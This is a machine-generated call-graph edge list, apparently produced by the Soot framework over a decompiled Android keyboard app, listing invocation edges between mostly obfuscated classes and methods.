SPECIAL edge: specialinvoke $r17.<mag: void <init>(java.lang.String,int,int)>("EXPRESSIVE_STICKER_AUTOCOMPLETE", 17, 17) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
STATIC edge: $i0 = staticinvoke <lkg: int a(int,int)>($i0, $i1) in <lkt: void e(int)> ==> <lkg: int a(int,int)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(7) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljd: int size()>() in <ljd: boolean isEmpty()> ==> <ljd: int size()>
VIRTUAL edge: $i0 = virtualinvoke r0.<qj: int b(java.lang.Object)>($r2) in <qj: java.lang.Object get(java.lang.Object)> ==> <qj: int b(java.lang.Object)>
SPECIAL edge: $r4 = specialinvoke r0.<ljf: java.lang.Object[] s()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: java.lang.Object[] s()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r3 = virtualinvoke $r1.<lsz: java.lang.Object d(java.lang.Object)>($r3) in <lsm: java.lang.Object d(lsz)> ==> <lsz: java.lang.Object d(java.lang.Object)>
SPECIAL edge: $z0 = specialinvoke r0.<lmo: boolean containsAll(java.util.Collection)>($r10) in <lqs: boolean containsAll(java.util.Collection)> ==> <java.util.AbstractCollection: boolean containsAll(java.util.Collection)>
SPECIAL edge: specialinvoke r0.<lkg: void g(int)>($i0) in <lkg: void c(java.lang.Object)> ==> <lkg: void g(int)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(18) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean z(java.lang.String)> ==> <java.lang.String: int length()>
VIRTUAL edge: $i0 = virtualinvoke $r2.<ljd: int d(int)>($i0) in <liz: java.lang.Object next()> ==> <ljd: int d(int)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <iej: void g(java.lang.String,iec)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <lnc: java.lang.Object next()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(3) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
INTERFACE edge: $r7 = interfaceinvoke $r3.<java.util.Map: java.util.Set entrySet()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.util.Set entrySet()>
STATIC edge: $r0 = staticinvoke <j$.util.concurrent.r: j$.util.concurrent.s g(j$.util.concurrent.s,j$.util.concurrent.s)>($r0, $r3) in <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)> ==> <j$.util.concurrent.r: j$.util.concurrent.s g(j$.util.concurrent.s,j$.util.concurrent.s)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lig: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<ljd: int size()>() in <ljb: void a()> ==> <ljd: int size()>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>($r1, null) in <j$.util.concurrent.ConcurrentHashMap: void q(int)> ==> <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqs: lsa l()>
STATIC edge: $z0 = staticinvoke <lvr: boolean e(int,int)>($i1, $i0) in <lvr: void <init>(lvr,lvr)> ==> <lvr: boolean e(int,int)>
INTERFACE edge: $i0 = interfaceinvoke $r2.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <lrg: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r1, 0, $r2, $i1, $i0) in <lqr: int b(java.lang.Object[],int)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
STATIC edge: $i2 = staticinvoke <izw: int ac(int)>($i0) in <lly: void j(java.lang.Object)> ==> <izw: int ac(int)>
STATIC edge: staticinvoke <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r2, $i0) in <lly: lma g()> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqs: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<ltc: void <init>(java.lang.String,int,int)>("MEDIUM", 1, 20) in <ltc: void <clinit>()> ==> <ltc: void <init>(java.lang.String,int,int)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("CuratedImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: virtualinvoke $r7.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Incomplete privateUse subtag, error index: ") in <nzh: boolean f(ivv)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $l3 = virtualinvoke $r17.<java.util.concurrent.atomic.AtomicLong: long getAndIncrement()>() in <lsd: boolean b(lsr)> ==> <java.util.concurrent.atomic.AtomicLong: long getAndIncrement()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(58) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: int indexOf(java.lang.String,int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<her: void <init>(miy)>($r0) in <her: her k(miy)> ==> <her: void <init>(miy)>
STATIC edge: $r5 = staticinvoke <ivw: java.lang.String[] Q(java.util.List)>($r4) in <ivw: void <init>(ivv,java.lang.String)> ==> <ivw: java.lang.String[] Q(java.util.List)>
STATIC edge: $i1 = staticinvoke <izw: int ac(int)>($i1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <izw: int ac(int)>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: void r(int,java.lang.Object,java.lang.Object,int,int)> ==> <ljd: int[] w()>
SPECIAL edge: specialinvoke $r4.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("identifier must not be empty") in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $z2 = virtualinvoke $r2.<j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>(r0, $l3, $l4, $l5) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>
SPECIAL edge: $r5 = specialinvoke r0.<ljf: java.lang.Object p()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: java.lang.Object p()>
SPECIAL edge: $i5 = specialinvoke r0.<ljf: int o(int,int,int,int)>($i4, $i5, $i3, $i0) in <ljf: boolean add(java.lang.Object)> ==> <ljf: int o(int,int,int,int)>
CLINIT edge: staticinvoke <lsq: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lsq: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l0, $i1, $i2) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
STATIC edge: $r0 = staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>() in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.lang.Runtime: java.lang.Runtime getRuntime()>
STATIC edge: $i1 = staticinvoke <izw: int ac(int)>($i1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <izw: int ac(int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
SPECIAL edge: specialinvoke $r0.<lth: void <init>(lto)>($r1) in <lth: lth i(java.lang.String)> ==> <lth: void <init>(lto)>
SPECIAL edge: specialinvoke $r6.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, $r1, $r2) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
INTERFACE edge: $r11 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getKey()>() in <hbv: void j()> ==> <lki: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(7) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <lma: lma i(int,java.lang.Object[])> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<lsn: void q(lsz,java.lang.Object)>($r13, $r11) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsn: void q(lsz,java.lang.Object)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r1) in <ivv: ivw b(java.lang.String)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
STATIC edge: $i0 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: int k(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: int k(int)>
SPECIAL edge: specialinvoke $r0.<mag: void <init>(java.lang.String,int,int)>("UNKNOWN_SEARCH_FEATURE", 0, 0) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: int hashCode()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(12) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
VIRTUAL edge: $r3 = virtualinvoke $r30.<java.lang.StringBuilder: java.lang.String toString()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]: ") in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <iye: void Q(int,int)>($i0, $i1) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <iye: void Q(int,int)>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/experiment/FlagFactory") in <hbu: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <ojg: boolean f(java.lang.Object,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Error: void <init>()>() in <java.lang.AssertionError: void <init>(java.lang.Object)> ==> <java.lang.Error: void <init>()>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Collection: java.lang.Object[] toArray()>() in <izw: java.lang.Object[] S(java.lang.Iterable)> ==> <java.util.AbstractCollection: java.lang.Object[] toArray()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(15) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>(r0, $l4, $l5, $l3) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lsc: lsw a(java.util.logging.Level)>($r2) in <lsc: lsw d()> ==> <lsh: lsw a(java.util.logging.Level)>
VIRTUAL edge: virtualinvoke r0.<j$.util.concurrent.q: j$.util.concurrent.l c()>() in <j$.util.concurrent.d: java.lang.Object next()> ==> <j$.util.concurrent.q: j$.util.concurrent.l c()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(11) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
VIRTUAL edge: $r4 = virtualinvoke $r3.<lma: lsa l()>() in <llg: void <init>(llo)> ==> <lqn: lsa l()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
STATIC edge: $i5 = staticinvoke <izw: int ah(int)>($i4) in <ljf: boolean add(java.lang.Object)> ==> <izw: int ah(int)>
STATIC edge: $r0 = staticinvoke <lsz: lsz c(java.lang.String,java.lang.Class)>("ratelimit_count", class "Ljava/lang/Integer;") in <lsl: void <clinit>()> ==> <lsz: lsz c(java.lang.String,java.lang.Class)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <jlu: void <init>(int)> ==> <java.lang.Object: void <init>()>
STATIC edge: $z0 = staticinvoke <ivw: boolean B(java.lang.String)>($r2) in <ivv: void f(java.lang.String)> ==> <ivw: boolean B(java.lang.String)>
VIRTUAL edge: $c1 = virtualinvoke $r1.<java.lang.String: char charAt(int)>(0) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: char charAt(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lka: void <init>()> ==> <java.lang.Object: void <init>()>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: int[] copyOf(int[],int)>($r1, $i0) in <ljf: void l(int)> ==> <java.util.Arrays: int[] copyOf(int[],int)>
SPECIAL edge: $i0 = specialinvoke r0.<qj: int j()>() in <qj: int b(java.lang.Object)> ==> <qj: int j()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: $c2 = virtualinvoke $r0.<java.lang.String: char charAt(int)>($i0) in <ivw: boolean B(java.lang.String)> ==> <java.lang.String: char charAt(int)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(18) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
STATIC edge: $i2 = staticinvoke <lma: int e(int)>($i1) in <lma: lma i(int,java.lang.Object[])> ==> <lma: int e(int)>
INTERFACE edge: $z0 = interfaceinvoke $r3.<java.util.List: boolean isEmpty()>() in <ivv: ivw a()> ==> <java.util.ArrayList: boolean isEmpty()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String replace(char,char)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $i0 = staticinvoke <lma: int e(int)>($i0) in <lly: lma g()> ==> <lma: int e(int)>
STATIC edge: $r0 = staticinvoke <iye: lfa p(lfa)>($r1) in <hfd: void <clinit>()> ==> <iye: lfa p(lfa)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljf: boolean m()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: boolean m()>
SPECIAL edge: specialinvoke $r13.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null throw statement replaced by Soot") in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
SPECIAL edge: $r3 = specialinvoke r0.<lvr: java.util.Map$Entry d(java.lang.String,int)>($r8, $i0) in <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])> ==> <lvr: java.util.Map$Entry d(java.lang.String,int)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalStateException: void <init>(java.lang.String)>($r4) in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lkf: void <init>()>() in <lqk: void <init>()> ==> <lkf: void <init>()>
VIRTUAL edge: $r5 = virtualinvoke $r4.<qj: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r3) in <ivv: ivw i(java.lang.String)> ==> <qj: java.lang.Object put(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <iec: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.p: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r1, $i5, $i1) in <ljf: int o(int,int,int,int)> ==> <izw: void an(java.lang.Object,int,int)>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.List: boolean isEmpty()>() in <ivv: int h()> ==> <java.util.ArrayList: boolean isEmpty()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <jhe: void <init>(lak,lsr,int,byte[])> ==> <java.lang.Object: void <init>()>
CLINIT edge: staticinvoke <com.google.android.apps.inputmethod.latin.ImeLatinApp: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <com.google.android.apps.inputmethod.latin.ImeLatinApp: void <clinit>()>
CLINIT edge: staticinvoke <lvt: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lvt: void <clinit>()>
SPECIAL edge: specialinvoke r0.<lwe: void <init>()>() in <lwa: void <init>()> ==> <lwe: void <init>()>
STATIC edge: $i8 = staticinvoke <izw: int af(int,int)>($i2, $i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int af(int,int)>
STATIC edge: $i8 = staticinvoke <izw: int aj(java.lang.Object,int)>($r1, $i3) in <ljf: int o(int,int,int,int)> ==> <izw: int aj(java.lang.Object,int)>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.util.ArrayList: void <init>()>() in <ivv: void <init>()> ==> <java.util.ArrayList: void <init>()>
VIRTUAL edge: $r6 = virtualinvoke $r7.<lsq: java.lang.String b()>() in <lsc: void f(java.lang.String,ltn)> ==> <lsp: java.lang.String b()>
INTERFACE edge: $r1 = interfaceinvoke $r2.<java.util.Set: java.lang.Object[] toArray()>() in <ljf: java.lang.Object[] toArray()> ==> <java.util.AbstractCollection: java.lang.Object[] toArray()>
CLINIT edge: staticinvoke <android.view.View: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <android.view.View: void <clinit>()>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c1) in <ivw: boolean F(java.lang.String)> ==> <ivw: boolean u(char)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<qj: java.lang.Object get(java.lang.Object)>($r0) in <ivw: ivw g(java.lang.String)> ==> <qj: java.lang.Object get(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
INTERFACE edge: $r1 = interfaceinvoke $r0.<java.util.Set: java.util.Iterator iterator()>() in <lri: int b(java.util.Set)> ==> <lqs: java.util.Iterator iterator()>
STATIC edge: $i1 = staticinvoke <lwk: int c(java.lang.StackTraceElement[],java.lang.Class,int)>($r2, $r1, 3) in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <lwk: int c(java.lang.StackTraceElement[],java.lang.Class,int)>
SPECIAL edge: specialinvoke $r13.<lvq: void <init>(lvr,int)>(r0, $i1) in <lvr: void <init>(lvr,lvr)> ==> <lvq: void <init>(lvr,int)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r10) in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
STATIC edge: $i8 = staticinvoke <izw: int ac(int)>($i6) in <lma: lma i(int,java.lang.Object[])> ==> <izw: int ac(int)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("Missing subtags to form a valid language tag") in <ivv: int h()> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean z(java.lang.String)>($r4) in <ivw: ivw d(java.util.Locale)> ==> <ivw: boolean z(java.lang.String)>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <lnc: java.lang.Object next()>
VIRTUAL edge: $r1 = virtualinvoke r0.<ivw: java.lang.String p()>() in <ivw: int hashCode()> ==> <ivw: java.lang.String p()>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r1) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.HashMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r12 = virtualinvoke $r7.<lts: java.lang.Object e(int)>($i1) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object e(int)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(1) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: $r3 = specialinvoke r0.<ljf: int[] r()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: int[] r()>
SPECIAL edge: specialinvoke $r3.<lvr: void <init>(java.util.List)>($r0) in <lvt: void <clinit>()> ==> <lvr: void <init>(java.util.List)>
STATIC edge: $z0 = staticinvoke <ivw: boolean F(java.lang.String)>($r6) in <ivw: ivw d(java.util.Locale)> ==> <ivw: boolean F(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <iej: void <clinit>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r2.<lts: int b()>() in <lsd: boolean b(lsr)> ==> <ltr: int b()>
STATIC edge: $z0 = staticinvoke <ivw: boolean v(java.lang.String)>($r0) in <ivw: boolean F(java.lang.String)> ==> <ivw: boolean v(java.lang.String)>
SPECIAL edge: specialinvoke $r5.<java.lang.StringBuilder: void <init>()>() in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: void clear()>() in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: void clear()>
CLINIT edge: staticinvoke <j$.sun.misc.b: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <j$.sun.misc.b: void <clinit>()>
STATIC edge: $z0 = staticinvoke <java.lang.reflect.Modifier: boolean isStatic(int)>($i2) in <j$.sun.misc.b: java.lang.reflect.Field i()> ==> <java.lang.reflect.Modifier: boolean isStatic(int)>
STATIC edge: $l2 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: long e(long)>($l2) in <j$.util.concurrent.ThreadLocalRandom: void c()> ==> <j$.util.concurrent.ThreadLocalRandom: long e(long)>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r1, $i0) in <ljf: java.lang.Object[] toArray()> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $r26 = virtualinvoke $r25.<java.lang.Class: java.lang.reflect.Method getDeclaredMethod(java.lang.String,java.lang.Class[])>("addSuppressed", $r24) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.Class: java.lang.reflect.Method getDeclaredMethod(java.lang.String,java.lang.Class[])>
SPECIAL edge: specialinvoke $r1.<java.lang.StringBuilder: void <init>()>() in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <lta: int hashCode()>
STATIC edge: $r5 = staticinvoke <lma: lma i(int,java.lang.Object[])>(5, $r4) in <lma: lma v(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <lma: lma i(int,java.lang.Object[])>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(double[],double[])>($r16, $r17) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(double[],double[])>
CLINIT edge: staticinvoke <ljd: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ljd: void <clinit>()>
VIRTUAL edge: $r12 = virtualinvoke $r11.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>($r1) in <lsd: boolean b(lsr)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
SPECIAL edge: specialinvoke $r5.<j$.util.concurrent.p: void <init>()>() in <j$.util.concurrent.q: j$.util.concurrent.l c()> ==> <j$.util.concurrent.p: void <init>()>
VIRTUAL edge: $r3 = virtualinvoke $r1.<java.lang.String: char[] toCharArray()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: char[] toCharArray()>
STATIC edge: $r4 = staticinvoke <lma: lma r(java.lang.Object)>($r1) in <lma: lma i(int,java.lang.Object[])> ==> <lma: lma r(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<lsg: void <init>()>() in <lsh: void <clinit>()> ==> <lsg: void <init>()>
SPECIAL edge: specialinvoke $r12.<mag: void <init>(java.lang.String,int,int)>("EXPRESSIVE_STICKER_IMAGE", 12, 12) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
CLINIT edge: staticinvoke <j$.util.concurrent.r: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <j$.util.concurrent.r: void <clinit>()>
SPECIAL edge: specialinvoke r0.<lsv: void <init>()>() in <lte: void <init>()> ==> <lsv: void <init>()>
